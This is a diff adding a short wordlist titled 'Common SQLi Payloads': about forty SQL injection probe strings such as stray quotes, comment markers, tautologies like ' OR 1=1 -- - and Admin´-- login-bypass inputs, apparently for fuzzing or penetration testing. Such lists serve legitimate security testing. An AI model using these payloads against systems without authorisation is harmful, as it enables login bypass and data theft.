@@ -1,0 +1,42 @@
+#Common SQLi Payloads
+'
+''
+`
+``
+
+´
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or #
+' OR '1
+' OR 1 -- -
+" OR ""="
+" OR 1=1 -- -
+'OR''='
+'='
+'LIKE'
+'=0--+
+OR 1=1
+'OR'x'='x
+'AND id IS NULL;--
+`or`1´=`1--
+`or(`1´=`1´--
+Admin´--
+Admin´#
+`having 1=1 --
+`or b = b --
+`or 1 = 1 #
+`or 2 > 1 --
+`or test=test --
+`)or`1´=`1--
+`or 10-5=5--
+`or sqltest=sql+test--
+`´or a = a -
+Admin´ --
+
